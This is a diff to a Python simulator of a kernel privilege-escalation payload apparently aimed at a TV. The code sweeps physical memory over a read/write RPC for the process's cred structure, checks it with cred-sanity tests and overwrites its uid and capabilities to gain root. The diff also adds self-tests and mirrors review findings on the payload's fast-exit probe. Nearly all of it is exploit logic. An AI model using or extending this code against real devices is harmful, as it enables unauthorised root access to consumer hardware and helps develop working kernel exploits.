@@ -454,13 +454,19 @@ def uid_word(u: int) -> str:
 
 
 def patch_gate(rpc, cred: int) -> bool:
-    """Payload PatchCred twin: write only when the uid reads 5001.
+    """Payload PatchCred twin: write only when the uid reads 5001 AND the cred
+    looks like a cred.
 
+    The second condition is SaneCred, which the payload has checked since v14 and
+    this twin was missing: a data word that happens to hold 5001 at +4 was
+    "rooted" by the sim and refused on the TV (review finding F1, 2026-10-26).
     Unlike `kernel_root.patch_ours` (which treats a uid-0 read as "already
     done"), PatchCred refuses 0: its callers only call it after they saw 5001,
     so a 0 here means the read moved under us and must not be trusted.
     """
     if cred_uid(rpc, cred) != OWNER_UID:
+        return False
+    if not K._sane_cred(rpc, cred):
         return False
     return K.patch_full(rpc, cred)
 
@@ -487,7 +493,11 @@ def high_alloc_gate(parent: int, cred: int, real: int, *, fast_mode: bool = True
         if kptr(real):
             if real >= 0xE0000000:
                 high_alloc = True
-                high_cred = real
+                # The payload logs highCred, and only back-fills it from `cred`
+                # when it is still zero - it never substitutes `real` for it
+                # (review finding F7).  Mirror that exactly.
+                if high_cred == 0:
+                    high_cred = cred
             else:
                 saw_low = True
     return (high_alloc and not saw_low and fast_mode), parent_high, high_cred, saw_low
@@ -557,7 +567,8 @@ O_SIBLING = 0x300         # fork() links &child->sibling into &parent->children
 
 def high_alloc_probe(rpc: MemRPC, child_virt: int, parent_virt: int, cred_virt: int, *,
                      comm: bytes = PROBE_COMM,
-                     span_pages: int = PROBE_SPAN_PAGES) -> dict:
+                     span_pages: int = PROBE_SPAN_PAGES,
+                     budget_pages: int | None = None) -> dict:
     """Twin of the v38.1 payload HighAllocProbe (Program.cs, fast-exit branch).
 
     The v31 "read-reliability limit" framing left two candidate causes for the
@@ -594,6 +605,12 @@ def high_alloc_probe(rpc: MemRPC, child_virt: int, parent_virt: int, cred_virt: 
 
     Returns the beacon fields: verdict, pp, cp, pc, hits, at, cred, cuid,
     cov (page range tuple or None), ms (always 0 - no wall clock in the sim).
+
+    `budget_pages` models the payload's 2.5 s stopwatch: the sweep stops after
+    that many page reads, so `cov` can end inside the requested span and a
+    `miss` becomes inconclusive instead of evidence of absence (finding F3).
+    The payload has no page counter, but a page read dominates the budget, so a
+    count is the faithful stand-in.
     """
     child_phys = v2p(child_virt)
     cpage = child_phys & ~0xFFF
@@ -635,6 +652,8 @@ def high_alloc_probe(rpc: MemRPC, child_virt: int, parent_virt: int, cred_virt: 
         return res
 
     cov_lo = cov_hi = 0
+    pages_read = 0
+    truncated = False
 
     def mark(page: int) -> None:
         nonlocal cov_lo, cov_hi
@@ -643,14 +662,26 @@ def high_alloc_probe(rpc: MemRPC, child_virt: int, parent_virt: int, cred_virt: 
         if page > cov_hi:
             cov_hi = page
 
+    def budget_spent() -> bool:
+        nonlocal truncated
+        if budget_pages is not None and pages_read >= budget_pages:
+            truncated = True
+            return True
+        return False
+
     if parent_high:
         for step in range(span_pages + 1):
+            if truncated:
+                break
             dirs = (0,) if step == 0 else (-1, 1)
             for d in dirs:
+                if budget_spent():
+                    break
                 page = cpage + d * step * PAGE
                 if not SWEEP_LO <= page < SWEEP_HI:
                     continue
                 mark(page)
+                pages_read += 1
                 try:
                     data = rpc.read(page, PAGE)
                 except Exception:
@@ -690,23 +721,35 @@ def high_alloc_probe(rpc: MemRPC, child_virt: int, parent_virt: int, cred_virt: 
     # Parent low, the cred is the high object: locate cred content (ids
     # pattern, as CredScanNear sees it) and compare frames.  Locate only.
     anchor = cpage
+    child_cred_phys = 0
     try:
         cc = rpc.read_u32(child_phys + O_CRED)
         # the child's cred can itself be the high object (v30/v31 boots:
         # ccred=e2c35300) - its translated page is then outside the sweep and
         # the child's TASK page (low, the walk read its comm) is the anchor
-        if kptr(cc) and SWEEP_LO <= v2p(cc) < SWEEP_HI:
-            anchor = v2p(cc) & ~0xFFF
+        if kptr(cc):
+            child_cred_phys = v2p(cc)
+        if kptr(cc) and SWEEP_LO <= child_cred_phys < SWEEP_HI:
+            anchor = child_cred_phys & ~0xFFF
     except Exception:
         pass
     pat16 = struct.pack("<4I", OWNER_UID, OWNER_GID, OWNER_UID, OWNER_GID)
+    # The payload initialises this branch with "cred-miss" (Program.cs:835); the
+    # sim used to leave the generic "miss", so beacons.py/LOGGUIDE never learned
+    # the token and the two artifacts disagreed (review finding F2).
+    res["verdict"] = "cred-miss"
     for step in range(span_pages + 1):
+        if truncated:
+            break
         dirs = (0,) if step == 0 else (-1, 1)
         for d in dirs:
+            if budget_spent():
+                break
             page = anchor + d * step * PAGE
             if not SWEEP_LO <= page < SWEEP_HI:
                 continue
             mark(page)
+            pages_read += 1
             try:
                 d_ = rpc.read(page, PAGE)
             except Exception:
@@ -714,9 +757,16 @@ def high_alloc_probe(rpc: MemRPC, child_virt: int, parent_virt: int, cred_virt: 
             i = d_.find(pat16)
             while i >= 0:
                 if i >= 4:
+                    hit_cred = page + i - 4
+                    if child_cred_phys and child_cred_phys <= hit_cred < child_cred_phys + 0x40:
+                        # The ids pattern repeats every 8 bytes inside one cred;
+                        # the child's cred is a fork COPY and always holds our
+                        # ids, so skip the whole object (review 2026-10-26).
+                        i = d_.find(pat16, i + 1)
+                        continue
                     res["verdict"] = "cred-elsewhere"
                     res["at"] = page
-                    res["cred"] = page + i - 4
+                    res["cred"] = hit_cred
                     # cred_uid wants a kernel VA; res["cred"] is physical
                     res["cuid"] = cred_uid(rpc, (res["cred"] + PHYS_OFF) & 0xFFFFFFFF)
                     res["cov"] = (cov_lo, cov_hi)
@@ -1355,7 +1405,7 @@ def selftest() -> int:
         ("low parent + high cred fires",
          0xD5D905C0, 0xE0000100, 0, True, (True, False, 0xE0000100, False)),
         ("low parent + high real fires",
-         0xD5D905C0, 0, 0xE0000100, True, (True, False, 0xE0000100, False)),
+         0xD5D905C0, 0, 0xE0000100, True, (True, False, 0, False)),
         ("long mode never fast-exits",
          0xE3400B80, 0, 0, False, (False, True, 0, False)),
     ]
@@ -1420,6 +1470,31 @@ def selftest() -> int:
         not rooted3 and probes3 and probes3[0][4] == 1234
         and s3.read_u32(cr3 + O_UID) == 1234,
         f"probe uid={uid_word(probes3[0][4])}, cred untouched",
+    )
+    # A word that merely READS 5001 at +4 is not a cred: the payload's SaneCred
+    # (usage 1..0x10000, alignment) refuses it, and this twin did not until v39
+    # (review finding F1 - the sim rooted memory the TV protects).
+    s6 = MemRPC()
+    fake = 0x21100000
+    plant_cred(s6, fake, usage=0xDEADBEEF)
+    failed += not _check(
+        "PatchCred twin refuses a non-cred that reads 5001",
+        patch_gate(s6, fake) is False
+        and s6.read_u32(fake + O_UID) == OWNER_UID,
+        f"usage=0xDEADBEEF uid untouched={s6.read_u32(fake + O_UID)}",
+    )
+    # a uid-0 cred must get NO capability writes: the old patch_full treated
+    # "already uid 0" as success and then wrote cap_permitted/effective, which a
+    # stale task pointer can aim at init's cred (review 2026-10-26).
+    s8 = MemRPC()
+    zero_cred = plant_cred(s8, 0x21300000, uid=0, gid=0, usage=4)
+    before8 = s8.read(zero_cred + K.O_CAP_PERMITTED, 16)
+    ok8 = K.patch_full(s8, (zero_cred + PHYS_OFF) & 0xFFFFFFFF)
+    after8 = s8.read(zero_cred + K.O_CAP_PERMITTED, 16)
+    failed += not _check(
+        "patch_full leaves a uid-0 cred's caps untouched",
+        ok8 is False and before8 == after8,
+        f"before={before8.hex()} after={after8.hex()} rc={ok8}",
     )
     # ...an unreadable cred PAGE keeps a valid cred pointer but reads unread...
     s4 = ReadStaleRPC()
@@ -1657,6 +1732,41 @@ def selftest() -> int:
         h["verdict"] == "miss" and h["at"] is None and h["cov"] is not None
         and h["cov"][1] < 0x40000000,
         f"cov={h['cov'][0]:#x}-{h['cov'][1]:#x}",
+    )
+
+    # a truncated budget cannot cover the span: the payload stops at 2.5 s and
+    # the beacon must still say `miss` with a SHORT cov (finding F3)
+    h = high_alloc_probe(r, child_v, P_HI, 0, budget_pages=4)
+    span = h["cov"][1] - h["cov"][0] if h["cov"] else 0
+    failed += not _check(
+        "high-scan budget truncates the sweep (cov is the truth)",
+        h["verdict"] == "miss" and h["cov"] is not None and span <= 0x4000,
+        f"cov={h['cov']} span={span:#x}",
+    )
+
+    # parent low, no ids pattern in range: the payload's verdict token is
+    # cred-miss, not the generic miss (finding F2)
+    r2 = MemRPC()
+    cp2 = 0x24000000
+    plant_task(r2, cp2, b"PHYRFORK", 0xE4D49100)   # child cred itself high
+    h = high_alloc_probe(r2, (cp2 + PHYS_OFF) & 0xFFFFFFFF, 0, 0)
+    failed += not _check(
+        "high-scan low-parent/no-hit says cred-miss",
+        h["verdict"] == "cred-miss",
+        f"verdict={h['verdict']}",
+    )
+
+    # the child's OWN cred is in the sweep and matches the ids pattern; it is a
+    # fork copy, so it must not be reported as cred-elsewhere (review 2026-10-26)
+    r3 = MemRPC()
+    cp3 = 0x24200000
+    cc3 = plant_cred(r3, 0x24201000)                # low, in the sweep
+    plant_task(r3, cp3, b"PHYRFORK", cc3)           # plant_task adds PHYS_OFF
+    h = high_alloc_probe(r3, (cp3 + PHYS_OFF) & 0xFFFFFFFF, 0, 0)
+    failed += not _check(
+        "high-scan ignores the child's own cred in cred-elsewhere",
+        h["verdict"] == "cred-miss",
+        f"verdict={h['verdict']} cred={h['cred']}",
     )
 
     # cred-elsewhere: parent low and readable, the CRED is the high object;
